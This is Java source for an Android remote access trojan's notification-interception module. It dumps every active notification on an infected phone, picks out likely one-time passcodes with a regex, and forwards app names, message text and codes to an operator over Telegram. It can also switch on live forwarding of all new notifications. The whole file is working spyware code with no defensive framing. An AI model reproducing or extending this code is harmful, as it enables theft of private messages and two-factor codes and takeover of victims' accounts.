package com.enterprise.rat.commands;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import com.enterprise.rat.services.NotificationService;
import com.enterprise.rat.utils.TelegramApi;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class NotificationInterceptManager {

    public static void dumpFullHistory() {
        NotificationService service = NotificationService.getInstance();
        if (service == null) { TelegramApi.sendMessage("❌ Notification Service not active."); return; }
        StatusBarNotification[] notifications = service.getActiveNotifications();
        if (notifications == null || notifications.length == 0) {
            TelegramApi.sendMessage("🔔 No active notifications.");
            return;
        }

        StringBuilder sb = new StringBuilder("<b>🔔 Notification History (" + notifications.length + ")</b>\n\n");
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.US);
        Pattern otpPattern = Pattern.compile("\\b(\\d{4,8})\\b");

        for (StatusBarNotification sbn : notifications) {
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "N/A");
            String text = extras.getCharSequence(Notification.EXTRA_TEXT, "").toString();
            long timestamp = sbn.getPostTime();

            sb.append("<b>App:</b> <code>").append(sbn.getPackageName()).append("</code>\n");
            sb.append("<b>Title:</b> ").append(title).append("\n");
            sb.append("<b>Text:</b> ").append(text.length() > 200 ? text.substring(0, 200) + "..." : text).append("\n");
            sb.append("<b>Time:</b> ").append(sdf.format(new Date(timestamp))).append("\n");

            // Highlight OTP codes
            Matcher matcher = otpPattern.matcher(text);
            while (matcher.find()) {
                String otp = matcher.group(1);
                if (otp.length() >= 4 && otp.length() <= 8 && !otp.startsWith("20") && !otp.startsWith("19")) {
                    sb.append("🔐 <b>OTP DETECTED:</b> <code>").append(otp).append("</code>\n");
                }
            }
            sb.append("---\n");
        }
        TelegramApi.sendMessage(sb.toString());
    }

    public static void interceptLive() {
        NotificationService service = NotificationService.getInstance();
        if (service != null) {
            service.setLiveInterceptEnabled(true);
            TelegramApi.sendMessage("🔔 Live notification interception enabled. All new notifications will be forwarded.");
        } else {
            TelegramApi.sendMessage("❌ Notification Service not active.");
        }
    }

    public static void stopLiveIntercept() {
        NotificationService service = NotificationService.getInstance();
        if (service != null) {
            service.setLiveInterceptEnabled(false);
            TelegramApi.sendMessage("🔔 Live notification interception stopped.");
        }
    }
}
